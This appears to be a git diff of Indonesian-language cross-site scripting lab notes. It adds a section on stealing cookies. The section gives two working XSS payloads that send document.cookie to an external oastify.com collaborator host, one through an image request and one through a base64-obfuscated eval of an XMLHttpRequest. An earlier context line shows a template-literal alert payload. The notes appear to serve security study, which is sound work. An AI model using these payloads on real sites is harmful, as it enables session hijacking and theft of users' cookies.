@@ -129,3 +129,12 @@ link tag canonical pada `<head>` memungkinkan terjadinya XSS dengan menambahkan 
 
 **Payload** : `${alert(document.domain)}`
 **Penjelasan** : Karena pada script menggunakan template literal dengan tanda \` itu menandakan kita bisa memasukan javascript code ke dalam ${}
+
+### Exploiting cross-site scripting to steal cookies
+**Payload**:
+```js
+<script>var i=new Image(); i.src="http://z99oqbqbw51wp1w0xw0fu7uau10soic7.oastify.com/?cookie="+btoa(document.cookie);</script>
+
+<script>eval(atob('dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyLm9wZW4oIkdFVCIsICJodHRwczovL3o5OW9xYnFidzUxd3AxdzB4dzBmdTd1YXUxMHNvaWM3Lm9hc3RpZnkuY29tLz8iK2RvY3VtZW50LmNvb2tpZSwgdHJ1ZSk7Cnhoci5zZW5kKCk7'))</script>
+```
+
